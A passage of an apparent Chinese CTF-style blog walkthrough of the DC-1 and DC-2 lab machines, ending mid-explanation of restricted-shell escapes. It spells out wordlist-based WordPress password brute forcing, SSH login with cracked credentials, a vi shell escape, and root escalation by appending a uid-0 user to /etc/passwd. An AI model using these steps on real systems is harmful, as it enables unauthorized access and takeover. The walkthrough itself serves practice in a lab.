alt="image-20240715132521386"></p><p>发现了一个shell脚本<code>test.sh</code>，但是光看名字感觉就好像不太能提权的样子。还有一个提示信息，提示在存储邮件文件的文件夹<code>/var/mail/jim</code>下有新的邮件，尝试进入查看并寻找有用信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /var/mail/jim<br></code></pre></td></tr></table></figure><p>提示错误：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715132833915.png" alt="image-20240715132833915"></p><p>再次尝试进入其上一级目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /var/mail<br><span class="hljs-built_in">ls</span><br><span class="hljs-built_in">cat</span> jim<br></code></pre></td></tr></table></figure><p>成功：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715132958425.png" alt="image-20240715132958425"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715133158149.png" alt="image-20240715133158149"></p><p>读取邮件信息可以得到jim的同事，Charles的账户信息：</p><blockquote><p>user：Charles</p><p>password：^xHhA&amp;hvim0y</p></blockquote><p>尝试远程登陆Charles的账户：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh Charles@192.168.204.133<br></code></pre></td></tr></table></figure><p>因为已经远程登陆了jim账户，所再尝试同时登陆Charles的账户时就会被拒绝请求，因此我们需要在jim终端进行账户切换。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">su Charles<br>su charles<br></code></pre></td></tr></table></figure><p>惹，报错惹：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715133710662.png" alt="image-20240715133710662"></p><p>回去查看了一下邮件，发现其对jim的称呼为<code>Jim</code>，猜测实际用户名应该是小写开头。</p><p>ok！成功切换：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715133858991.png" alt="image-20240715133858991"></p><p>查看charles用户中具有SUID权限的命令都有哪些：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715134104570.png" alt="image-20240715134104570"></p><p>查询结果和jim的一样，再使用<code>sudo -l</code>显示出当前登陆用户的权限：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715134313545.png" alt="image-20240715134313545"></p><p>根据提示信息可以知道，<code>/usr/bin/teehee</code>具有root权限，可以尝试提权。</p><blockquote><p>teehee是一个小众的linux编辑器，若其拥有root权限，则可用于提权。提权的核心思路是：利用其在passwd文件中追加一条uid为0的用户条目。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Name::0:0:::/bin/bash&quot;</span> | sudo teehee -a /etc/passwd<br></code></pre></td></tr></table></figure><p>这里的<code>Name</code>可以是任意名字。执行该条指令之后，再执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">su Name<br></code></pre></td></tr></table></figure><p>即可成功提权！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715135103294.png" alt="image-20240715135103294"></p><p>四处查看文件：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715135346117.png" alt="image-20240715135346117"></p><p>退回上一级目录，进行文件匹配查找：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name *flag*<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715135445574.png" alt="image-20240715135445574"></p><p>ok！成功找到！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715135511759.png" alt="image-20240715135511759"></p><p>提权完毕！</p><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>使用hydra爆破SSH账户进行提权，其过程要比burpsuite爆破并进行exim4提权的过程要简单和快速。</p><ol><li>信息检索能力很重要，拿到主机shell的时候多去翻翻目录<code>var</code>、<code>home</code>等等目录，找找信息。</li><li>exim4、teehee可以用于提权，多找命令。</li><li>如何使用命令执行反弹shell。</li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DC-2</title>
    <link href="/2024/07/24/DC-2/"/>
    <url>/2024/07/24/DC-2/</url>
    
    <content type="html"><![CDATA[<h1 id="DC-2"><a href="#DC-2" class="headerlink" title="DC-2"></a>DC-2</h1><h2 id="IP扫描"><a href="#IP扫描" class="headerlink" title="IP扫描"></a>IP扫描</h2><p>查看kali主机IP：（ifconfig）</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721827301193.png"></p><p>将目标靶机的“网络适配器”模式改为“NAT”模式，保证其使用与kali相同的模式，即使得二者处于同一个网段内。</p><p>使用nmap扫描确认靶机的IP地址（最好在root权限下进行操作，以防出现权限不足的情况）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sN 192.168.204.0/24<br></code></pre></td></tr></table></figure><p>未打开靶机前进行kali网段IP扫描：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721827357707.png" alt="img"></p><p>打开靶机后进行kali网络IP扫描：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721827411142.png" alt="img"></p><p>通过对比可以得到，靶机的IP地址为：<code>192.168.204.131</code></p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><ul><li><p>普通开放端口扫描</p><p><code>-sV</code> ：对端口上的服务程序进行扫描，扫描提供服务的版本。</p><p><code>-sT</code>：TCP连接扫描，不安全，速度较慢，但相对准确。</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sV -p- 192.168.204.131<br>nmap -sT -p- 192.168.204.131<br></code></pre></td></tr></table></figure><p>扫描结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721827522630.png" alt="img"></p><p>可以看到，开放的端口有<code>80</code>和<code>7744</code>。</p><ul><li><p>开放端口详细扫描</p><p><code>-sT</code> ：TCP连接扫描，不安全，速度较慢，但相对准确</p><p><code>-sV</code> ： 对端口上的服务程序进行扫描，扫描提供服务的版本</p><p><code>-sC</code> ：表示使用默认的脚本进行扫描</p><p><code>-O</code> ：扫描操作系统的版本</p><p><code>-p </code>： 指定扫描端口</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sT -sV -sC -O -p 80,7744 192.168.204.131<br></code></pre></td></tr></table></figure><p>扫描结果如下：<br><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721827560872.png" alt="img"></p><p>由扫描结果，似乎没有什么有用的信息，比如目标靶机是使用什么框架的网站之类的。</p><h2 id="gobuster目录爆破"><a href="#gobuster目录爆破" class="headerlink" title="gobuster目录爆破"></a>gobuster目录爆破</h2><p>端口扫描得到的有效信息太少，所以尝试使用gobuster目录爆破去获取更多有用的信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u http://192.168.204.131 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br></code></pre></td></tr></table></figure><p>爆破结果如下:</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721827634237.png" alt="img"></p><p>获得三个目标靶机目录下的网页链接:</p><blockquote><p> <a href="http://192.168.204.131/wp-content/">http://192.168.204.131/wp-content/</a></p><p> <a href="http://192.168.204.131/wp-includes/">http://192.168.204.131/wp-includes/</a></p><p> <a href="http://192.168.204.131/wp-admin/">http://192.168.204.131/wp-admin/</a></p></blockquote><p>对这三个网页逐个进行访问:</p><p>① <a href="http://192.168.204.131/wp-content/">http://192.168.204.131/wp-content/</a> 没有内容加载出来</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721827670668.png" alt="img"></p><p>② <a href="http://192.168.204.131/wp-includes/">http://192.168.204.131/wp-includes/</a> 有很多php脚本文件</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721827720354.png"></p><p>③ <a href="http://192.168.204.131/wp-admin/">http://192.168.204.131/wp-admin/</a> 无法访问</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721827759682.png" alt="img"></p><p>而且可以发现,输入网址<code>http://192.168.204.131/wp-admin/</code>,浏览器总会将其重定向至<code>dc-2</code>导致发生错误。</p><h2 id="重定向修改访问"><a href="#重定向修改访问" class="headerlink" title="重定向修改访问"></a>重定向修改访问</h2><p>访问目标靶机的IP地址，<code>192.168.204.131</code>，查看网页的返回界面。如下：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721827793444.png" alt="img"></p><p>经过多次尝试之后可以得知，每次访问目标靶机IP地址时，其响应网页都会被重定向到域名<code>dc-2</code>。由此判断，该IP地址网页被做了重定向处理。</p><p>回顾之前的nmap详细扫描，已经展现出一些网页重定向的端倪了：</p><p>（由于第一次实验图片丢失，第二遍补做实验的时候nmap详细扫描出来的结果稍有变化，但第一次实验其http-title确实有如下提示）</p><blockquote><p>http-title: Did not follow redirect to <a href="http://dc-2/">http://dc-2/</a></p><p>​  未遵循重定向到<a href="http://dc-2/">http://dc-2/</a></p></blockquote><p>解决重定向处理问题，找到原靶机主页的方法（之一）：</p><blockquote><p>对本地（kali）的host文件进行修改。</p><p>打开 <code>etc/hosts</code>文件，添加本地DNS记录 <code>192.168.204.131 dc-2</code></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/hosts<br></code></pre></td></tr></table></figure><p>然后在上方的<code>IP-域名</code>处添加靶机IP与“dc-2”的关联记录。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721828170873.png" alt="img"></p><p>然后在浏览器中重新访问靶机IP地址，得到的效果如下：</p><blockquote><p>注意! 这里的DNS记录添加到的是kali内部的<code>hosts</code>文件，所以重定向修改生效的效果也只会在kali虚拟机内部展现出来。</p><p>如果想要在自己的物理主机上也能实现重定向修改的话，需要修改<code>本物理主机的hosts</code>文件。以管理员权限访问 <code>C:\Windows\System32\drivers\etc</code>下的hosts文件，添加靶机IP与“dc-2”的关联记录。</p></blockquote><p>在kali浏览器中访问网址<code>192.168.204.131</code>，得到的效果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721828285726.png" alt="img"></p><p>可以看到，已经不是之前的重定向无响应界面了，网址的返回网页是正常网页类型。</p><h2 id="Flag1"><a href="#Flag1" class="headerlink" title="Flag1"></a>Flag1</h2><p>环视网页内容，可以发现右下角有一个<code>flag1</code>字样的选择栏，点进去：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721828251738.png" alt="img"></p><p>flag1有一个提示信息：</p><blockquote><p>Flag 1:</p><p>Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.</p><p>你通常的单词表（字典）可能不起作用，因此，也许你只需要（成为）cewl</p></blockquote><p>cewl是什么？经过网络查询。</p><table><thead><tr><th align="left">cewl，自定义词表生成器，是一个ruby程序，是kali linux下的一个工具。可以将特定URL爬取到定义的深度并返回关键字列表（字典）。密码破解者如John the Ripper、Medusa和 WFuzz 可以使用这些关键字来破解密码。Cewl 还有一个相关的命令行应用程序 FAB，它使用相同的元数据提取技术，使用 CeWL 等信息提取算法从已下载的文件中生成作者&#x2F;制作者列表。</th></tr></thead></table><p>Kali Linux字典生成工具Cewl使用全指南：</p><p><a href="https://www.freebuf.com/articles/network/190128.html">https://www.freebuf.com/articles/network/190128.html</a></p><p>你以为接下来就是要开始使用cewl啦？别急，我们先干接下来这事。</p><p>回顾靶场dc-1，我们通过识别nmap漏扫获取了网页的使用框架，然后通过metasploit查找该框架的漏洞。利用漏洞实现了用户登陆以及用户提权。</p><p>所以在dc-2这个靶场中，我们也尝试通过获取目标网页所使用框架等技术构成信息。但是前面的端口扫描也没有扫出什么有用的信息，所以我们尝试使用whatweb指纹工具来进行识别。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629104913096.png" alt="image-20240629104913096"></p><p>或者利用浏览器插件wappalyer进行指纹识别：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629105413201.png" alt="image-20240629105413201"></p><p>得到的部分信息如下：</p><blockquote><p> WordPress 4.7.10</p><p> Apache 2.4.10</p><p> JQuery 1.12.4</p><p> JQuery MIgrate 1.4.1</p><p> Databases MySQL</p></blockquote><p>其中<code>WordPress</code>是一个广泛使用的开源CMS，基于PHP语言开发。ok，我们又获取了网页的框架信息，尝试查找这个框架的相关漏洞，并尝试利用漏洞。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfconsole<br><br>search WordPress<br></code></pre></td></tr></table></figure><p>可以找到有117个漏洞（很多，就不一一截图记录了）：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629111815721.png" alt="image-20240629111815721"></p><p>可以尝试使用最新的一个漏洞进行利用尝试。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629160813860.png" alt="image-20240629160813860"></p><p>利用这个23年11月的最新高等级的漏洞：</p><p> <code>exploit/multi/http/wp_royal_elementor_addons_rce</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/multi/http/wp_royal_elementor_addons_rce<br><br>show options<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629161500801.png" alt="image-20240629161500801"></p><p>可以看到，这里的<code>RHOSTS</code>也设置为必须设置，因此我们可以尝试设置其为目标靶机地址<code>192.168.204.131</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> RHOSTS 192.168.204.131<br><br>show options<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629161754704.png" alt="image-20240629161754704"></p><p>执行运行命令：run&#x2F;exploit</p><p>正常来说，如果成功应用的话会返回提示信息“Meterpreter session 1 opened”</p><p>但是根据打印出来的提示信息，发现无论是执行run还是exploit命令，都没有session被成功创建。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629161951832.png" alt="image-20240629161951832"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629162306263.png" alt="image-20240629162306263"></p><p>所以这个漏洞我们没法利用。</p><p>尝试利用其它漏洞，但发现修改都没办法应用执行。所以通过漏洞来实现攻击这一方法遇到了瓶颈。</p><p>ok！既然常规思维无法利用漏洞。那么我们就琢磨一下flag1提示的<code>cewl</code>。</p><blockquote><p>cewl -h ：帮助命令，输出所有可接受的选项参数以及对应的选项描述。</p><p>默认方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cewl http://www.ignitetechnologies.in/（指定URL）<br></code></pre></td></tr></table></figure><p>输入命令之后，爬虫会根据<strong>指定的URL</strong>和深度进行爬取，然后打印出可用于密码破解的字典。</p><p>若想将打印出的字典存储为文件，则使用<code>-w Name.txt</code>参数来将其存储为txt文件。</p><p>若想生成指定长度的密码字典，则通过使用<code>-m length</code>选项来设置，保证生成的密码长度至少为九位。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">cewl http://dc-2/ -w CewlDict.txt<br><br><span class="hljs-built_in">cat</span> CewlDict.txt<br></code></pre></td></tr></table></figure><p>得到一个可用于密码破解的字典（关键字列表）文件：</p><blockquote><p>这里访问的URL是通过域名访问的。因为前面的IP地址被重定向过。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629165118422.png" alt="image-20240629165118422"></p><p>通过 cewl 获得一个可用于密码破解的字典之后。之后的正常思路就是寻找登陆界面进行密码爆破攻击。但是前面在解决重定向问题访问靶机地址后返回的网页中，并没有显示出有关用户登陆的任何界面。</p><p>所以我们还得找！</p><p>之前进行目录爆破的时候，我们获取了三个目录链接：</p><blockquote><p><a href="http://192.168.204.131/wp-content/">http://192.168.204.131/wp-content/</a></p><p><a href="http://192.168.204.131/wp-includes/">http://192.168.204.131/wp-includes/</a></p><p><a href="http://192.168.204.131/wp-admin/">http://192.168.204.131/wp-admin/</a></p></blockquote><p>在kali（本地物理主机的hosts文件未修改，wp-admin界面依然会被重定向到dc-2造成错误）中分别再次访问这三个网页。</p><ul><li><p><a href="http://192.168.204.131/wp-content/">http://192.168.204.131/wp-content/</a></p><p>依然没有任何东西：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629170926175.png" alt="image-20240629170926175"></p></li><li><p><a href="http://192.168.204.131/wp-includes/">http://192.168.204.131/wp-includes/</a></p><p>返回的内容仍然是之前的那些，不知道有何作用，没有找到啥有价值的东西。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629171052842.png" alt="image-20240629171052842"></p></li><li><p><a href="http://192.168.204.131/wp-admin/">http://192.168.204.131/wp-admin/</a></p><p>原本是无响应的被重定向的界面，现在返回了一个登陆界面。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629171202086.png" alt="image-20240629171202086"></p></li></ul><p>ok！登陆界面找到啦！！！</p><p>捋一下，现在密码字典有了，登陆界面有了，剩下还需要查找用户名，就可以进行密码爆破了。</p><h2 id="wpscan扫描"><a href="#wpscan扫描" class="headerlink" title="wpscan扫描"></a>wpscan扫描</h2><p>什么是wpscan扫描？</p><table><thead><tr><th align="left"><code>WPScan</code>是一个扫描 <code>WordPress</code> 漏洞的黑盒子扫描器，它可以为所有 <code>Web</code> 开发人员扫描 <code>WordPress</code> 漏洞并在他们开发前找到并解决问题。常搭配<code>Nikto</code>使用，一款非常棒的<code>Web</code> 服务器评估工具。</th></tr></thead></table><p>使用教程：<a href="https://blog.csdn.net/weixin_41924764/article/details/120984618%EF%BC%88WPScan%E4%BD%BF%E7%94%A8%E5%AE%8C%E6%95%B4%E6%95%99%E7%A8%8B%E4%B9%8B%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9WordPress%E7%9A%84%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B%EF%BC%89">https://blog.csdn.net/weixin_41924764/article/details/120984618（WPScan使用完整教程之记一次对WordPress的渗透过程）</a></p><p>为什么是wpscan？</p><p>因为前面进行指纹识别的时候得到的网站信息，其使用了<code>WordPress</code>框架。</p><h3 id="wpscan扫描WordPress有效用户"><a href="#wpscan扫描WordPress有效用户" class="headerlink" title="wpscan扫描WordPress有效用户"></a>wpscan扫描WordPress有效用户</h3><p>通过扫描在wordpress中有效的用户，确定用户的用户名，进而使用密码字典进行爆破。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan --url http://dc-2/ -e u<br></code></pre></td></tr></table></figure><p>执行命令（注意是<code>--url</code>两条<code>-</code>哦）。</p><p>在查询结果中，有一块<code>User(s) Identified:</code>（已认证用户）模块选项：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629180120896.png" alt="image-20240629180120896"></p><p>可以看到，有三个已通过认证的用户：</p><blockquote><p>admin</p><p>jerry</p><p>tom</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> usersname.txt<br>vim usersname.txt<br><span class="hljs-built_in">cat</span> usersname.txt<br></code></pre></td></tr></table></figure><p>新建一个文件，将用户名存入文件中，保存退出，cat查看文件内容。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629182533839.png" alt="image-20240629182533839"></p><h3 id="爆破用户密码"><a href="#爆破用户密码" class="headerlink" title="爆破用户密码"></a>爆破用户密码</h3><p>使用获取得到的用户名字典和密码字典进行爆破，获取可登陆用户账户。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan --url http://dc-2/ -U usersname.txt -P CewlDict.txt<br></code></pre></td></tr></table></figure><p><code>-U</code>：指定用户名字典</p><p><code>-P</code>：指定密码爆破字典</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629185111829.png" alt="image-20240629185111829"></p><p>爆破出两个普通用户的账户密码咯！</p><blockquote><p>Username: jerry, Password: adipiscing</p><p>Username: tom, Password: parturient</p></blockquote><p>使用这两个账号登陆（这里使用jerry的登陆）：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629185920193.png" alt="image-20240629185920193"></p><p>浏览当前页面信息，并没有一些有用的信息。</p><p>继续浏览其它模块的界面：</p><p>在<code>Pages</code>模块发现了选项Flag2:</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629191506509.png" alt="image-20240629191506509"></p><p>点进去查看其内容：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629191548650.png" alt="image-20240629191548650"></p><blockquote><p>If you can’t exploit WordPress and take a shortcut, there is another way.</p><p>Hope you found another entry point.</p><p>如果你不能利用WordPress走捷径，还有另一种方法。</p><p>希望你能找到另一个入口。</p></blockquote><p>此提示也验证了之前我们试图通过Metasploit进行WordPress漏洞的利用是行不通的。</p><p>再来捋一下，我们目前已经获取了用于登陆的两个用户名和密码。且已经明确了无法通过漏洞利用进行 Getshell 以及提权。</p><p>所以我们接下来可以尝试使用已获取的用户密码连接服务器！</p><h2 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h2><p>由前面的端口扫描可知，目标靶机开放的端口只有两个<code>80</code>端口和<code>7744</code>端口。</p><p>80端口常用于web网页http服务。代表http协议。通过上述操作，通过网页操作能获得的信息几近尽头。所以我们从7744端口进行切入。由提示信息，7744端口代表的是ssh协议，用于远程服务器连接。</p><p>跟自己远程连接kali的操作类似，只不过这里指定了7744端口：</p><ul><li>对 jerry 账号进行尝试</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh jerry@192.168.204.131 -p 7744<br></code></pre></td></tr></table></figure><p>但尝试后发现，无论是手打还是复制粘贴，请求都被拒绝了，因此排除密码输入错误的情况。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629192912615.png" alt="image-20240629192912615"></p><ul><li>对 tom 账号进行尝试</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh tom@192.168.204.131 -p 7744<br></code></pre></td></tr></table></figure><p>ok！成功登陆上了！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629193140246.png" alt="image-20240629193140246"></p><p>连上之后先 <code>ls</code>查看用户下的目录文件：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629200237330.png" alt="image-20240629200237330"></p><p>只有flag3文件，usr是系统资源文件，没啥太大的参考意义。</p><p><code>cat flag3.txt</code>查看文件内容，发现没有找到<code>cat</code>命令，判定为命令限制。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629201414849.png" alt="image-20240629201414849"></p><p>使用指令查看能够使用的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">compgen -c<br></code></pre></td></tr></table></figure><p>结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629201941121.png" alt="image-20240629201941121"></p><p>有很多命令捏，在末尾处有一个常见的linux文件操作指令<code>vi</code></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629202023822.png" alt="image-20240629202023822"></p><p>使用 vi 打开 flag3.txt 文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi flag3.txt<br></code></pre></td></tr></table></figure><p>权限不够，提示要提权：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629202509198.png" alt="image-20240629202509198"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>根据 flag3.txt 文件的提示，我们应该实现<strong>提权</strong>操作。根据上述<code>compgen -c</code>得到的命令信息，<code>vi</code>是linux下常见的文件操作命令。而且vi是vim的先前版本。通过网络搜索得知，vim能够用来实现提权。</p><blockquote><p>vim的主要用途是作为文本编辑器，但若其作为SUID运行，它将继承root用户的权限，因此它可以读取系统上的所有文件。</p><p>vim.tiny &#x2F;etc&#x2F;shadow 访问高密级文件</p><p>还可以通过vim打开shell</p><p>vim.tiny</p><p>：set shell&#x3D;&#x2F;bin&#x2F;sh</p><p>：shell</p></blockquote><p>首先，先使用<code>vi</code>命令随机打开一个文件（flag3.txt），然后按照保存长度文件的步骤，先<code>Esc + ：号</code>输入<code>set shell=/bin/sh</code>，回车，然后再<code>：号</code>输入<code>shell</code>点击回车即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">：<span class="hljs-built_in">set</span> shell=/bin/sh<br><br>：shell<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629204801206.png" alt="image-20240629204801206"></p><p><code>cd ..</code>返回上一级目录，执行ls的时候发现存在 jerry 和 tom 两个文件夹，可以说是实现了部分提权但仍未获得root用户权限。</p><p>进入jerry文件夹：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> jerry<br><br><span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629205337373.png" alt="image-20240629205337373"></p><p>可以看到有个 flag4 文件，查看其内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi flag4.txt<br></code></pre></td></tr></table></figure><p>（注意不是<code>cat</code>哦！cat被限制了）</p><p>得到如下信息：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629205603521.png" alt="image-20240629205603521"></p><p>根据提示信息，我们还需要去找到最后一个<code>flag</code>，而且它不给我们提示了。</p><p>接下来尝试<code>rbash绕过</code>来实现提权。</p><table><thead><tr><th align="left">rbash 是 restricted bash 的缩写，意思是受限制的 bash。它与shell的区别在于会限制一些行为，让一些命令无法执行。（本文中cat命令被限制）</th></tr></thead></table><blockquote><ul><li>RBASH 是一种特殊的 shell，它限制了用户的一些操作和权限，例如：<ul><li>不能使用 cd 命令来改变当前目录。</li><li>不能使用 set 命令来改变环境变量或 shell 选项。</li><li>不能使用 unset 命令来取消环境变量或 shell 函数。</li><li>不能使用任何包含 &#x2F; 符号的命令，除非它们在 PATH 环境变量中指定了。</li><li>不能重定向输入或输出，例如使用 &gt;, &lt;, &gt;&gt;, &lt;&lt; 等符号。</li><li>只能执行 PATH 环境变量中指定的命令，而且 PATH 